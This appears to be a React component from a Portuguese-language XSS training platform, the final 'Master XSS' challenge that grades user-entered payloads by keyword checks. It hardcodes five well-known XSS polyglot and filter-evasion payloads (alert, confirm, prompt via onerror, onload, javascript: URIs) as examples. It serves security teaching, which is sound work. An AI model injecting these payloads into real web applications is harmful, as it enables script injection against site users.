import React, { useState } from 'react';
import { ChallengeLayout } from '../ChallengeLayout';

const Challenge50: React.FC = () => {
  const [analysisData, setAnalysisData] = useState({
    payload: '',
    context: 'html',
    bypass: '',
    polyglot: false
  });
  const [analysisResult, setAnalysisResult] = useState<any>(null);
  const [currentPhase, setCurrentPhase] = useState(1);

  const analyzePayload = () => {
    const analysis = {
      phase1: {
        title: 'Análise de Contexto',
        passed: analysisData.context !== 'html' || !analysisData.payload.includes('<script>'),
        details: `Contexto: ${analysisData.context}, Payload detectado: ${analysisData.payload.includes('<script>') ? 'Script básico' : 'Avançado'}`
      },
      phase2: {
        title: 'Detecção de Bypass',
        passed: analysisData.bypass.length > 0 && (
          analysisData.bypass.includes('onerror') || 
          analysisData.bypass.includes('onload') ||
          analysisData.bypass.includes('javascript:')
        ),
        details: `Técnica de bypass: ${analysisData.bypass || 'Nenhuma detectada'}`
      },
      phase3: {
        title: 'Payloads Polyglot',
        passed: analysisData.polyglot && analysisData.payload.includes('</') && analysisData.payload.includes('/*'),
        details: `Polyglot: ${analysisData.polyglot ? 'Ativado' : 'Desativado'}`
      },
      phase4: {
        title: 'Exploração Avançada',
        passed: analysisData.payload.length > 50 && (
          analysisData.payload.includes('prototype') ||
          analysisData.payload.includes('constructor') ||
          analysisData.payload.includes('import(')
        ),
        details: 'Técnicas avançadas detectadas'
      }
    };

    setAnalysisResult(analysis);
    
    // Verificar se passou em todas as fases
    const allPassed = Object.values(analysis).every(phase => phase.passed);
    if (allPassed) {
      setCurrentPhase(5); // Fase final
    } else {
      const failedPhase = Object.entries(analysis).find(([_, phase]) => !phase.passed);
      setCurrentPhase(parseInt(failedPhase?.[0].replace('phase', '') || '1'));
    }
  };

  const contexts = [
    { value: 'html', label: 'HTML Content' },
    { value: 'attribute', label: 'HTML Attribute' },
    { value: 'script', label: 'Script Context' },
    { value: 'style', label: 'CSS Context' },
    { value: 'url', label: 'URL Parameter' }
  ];

  const masterPayloads = [
    `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e`,
    `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>">`,
    `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`,
    `"><script>alert(String.fromCharCode(88,83,83))</script>`,
    `';alert(String.fromCharCode(88,83,83));//';alert(String.fromCharCode(88,83,83));//";alert(String.fromCharCode(88,83,83));//";alert(String.fromCharCode(88,83,83));//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
  ];

  return (
    <ChallengeLayout challengeId={50}>
      <div className="space-y-6">
        <div className="bg-card p-6 rounded-lg border">
          <h2 className="text-xl font-semibold mb-4">🎯 Master XSS Challenge</h2>
          <p className="text-muted-foreground mb-4">
            Desafio final que combina todas as técnicas aprendidas. Demonstre domínio completo
            de XSS criando payloads que funcionem em múltiplos contextos.
          </p>
          
          <div className="mb-6">
            <h3 className="font-medium mb-2">📈 Progresso das Fases:</h3>
            <div className="flex gap-2 mb-4">
              {[1, 2, 3, 4, 5].map((phase) => (
                <div
                  key={phase}
                  className={`flex-1 h-2 rounded ${
                    phase <= currentPhase 
                      ? phase === 5 
                        ? 'bg-success' 
                        : 'bg-primary'
                      : 'bg-muted'
                  }`}
                />
              ))}
            </div>
            <p className="text-sm text-muted-foreground">
              Fase {currentPhase}/5: {
                currentPhase === 1 ? 'Análise de Contexto' :
                currentPhase === 2 ? 'Detecção de Bypass' :
                currentPhase === 3 ? 'Payloads Polyglot' :
                currentPhase === 4 ? 'Exploração Avançada' :
                '🎉 Master XSS Completo!'
              }
            </p>
          </div>
          
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium mb-2">Payload XSS:</label>
                <textarea
                  value={analysisData.payload}
                  onChange={(e) => setAnalysisData(prev => ({ ...prev, payload: e.target.value }))}
                  className="w-full h-32 p-3 border rounded-md font-mono text-sm"
                  placeholder="Seu payload XSS master aqui..."
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium mb-2">Contexto de Exploração:</label>
                <select
                  value={analysisData.context}
                  onChange={(e) => setAnalysisData(prev => ({ ...prev, context: e.target.value }))}
                  className="w-full p-2 border rounded-md"
                >
                  {contexts.map(ctx => (
                    <option key={ctx.value} value={ctx.value}>{ctx.label}</option>
                  ))}
                </select>
              </div>
              
              <div>
                <label className="block text-sm font-medium mb-2">Técnica de Bypass:</label>
                <input
                  type="text"
                  value={analysisData.bypass}
                  onChange={(e) => setAnalysisData(prev => ({ ...prev, bypass: e.target.value }))}
                  className="w-full p-2 border rounded-md"
                  placeholder="onerror, onload, javascript:, etc."
                />
              </div>
              
              <div className="flex items-center gap-2">
                <input
                  type="checkbox"
                  id="polyglot"
                  checked={analysisData.polyglot}
                  onChange={(e) => setAnalysisData(prev => ({ ...prev, polyglot: e.target.checked }))}
                />
                <label htmlFor="polyglot" className="text-sm">Usar payload polyglot</label>
              </div>
              
              <button
                onClick={analyzePayload}
                className="w-full px-4 py-2 bg-primary text-primary-foreground rounded-md hover:bg-primary/80"
              >
                Analisar Payload
              </button>
            </div>
            
            <div className="space-y-4">
              {analysisResult && (
                <div>
                  <h3 className="font-medium mb-2">📊 Resultado da Análise:</h3>
                  <div className="space-y-2">
                    {Object.entries(analysisResult).map(([key, phase]: [string, any]) => (
                      <div
                        key={key}
                        className={`p-3 border rounded ${
                          phase.passed 
                            ? 'bg-success/10 border-success/30' 
                            : 'bg-destructive/10 border-destructive/30'
                        }`}
                      >
                        <div className="flex items-center gap-2 mb-1">
                          <span className={phase.passed ? 'text-success' : 'text-destructive'}>
                            {phase.passed ? '✅' : '❌'}
                          </span>
                          <span className="font-medium text-sm">{phase.title}</span>
                        </div>
                        <p className="text-xs text-muted-foreground">{phase.details}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}
              
              <div>
                <h3 className="font-medium mb-2">🚀 Payloads Master:</h3>
                <div className="space-y-2">
                  {masterPayloads.map((payload, index) => (
                    <button
                      key={index}
                      onClick={() => setAnalysisData(prev => ({ ...prev, payload }))}
                      className="w-full text-left p-2 text-xs bg-muted hover:bg-muted/80 rounded border font-mono"
                    >
                      {payload.substring(0, 80)}...
                    </button>
                  ))}
                </div>
              </div>
            </div>
          </div>
          
          {currentPhase === 5 && (
            <div className="mt-6 p-4 bg-success/10 border border-success/30 rounded">
              <h3 className="font-medium text-success mb-2">🎉 Parabéns! Master XSS Completo!</h3>
              <p className="text-sm">
                Você demonstrou domínio completo das técnicas de XSS, incluindo:
                análise de contexto, bypass de filtros, payloads polyglot e exploração avançada.
                Agora você é um verdadeiro especialista em segurança web!
              </p>
            </div>
          )}
          
          <div className="mt-4 p-3 bg-accent/10 border border-accent/30 rounded">
            <p className="text-sm">
              💡 <strong>Objetivo:</strong> Crie um payload que passe em todas as 4 fases de validação!
            </p>
          </div>
        </div>
      </div>
    </ChallengeLayout>
  );
};

export default Challenge50;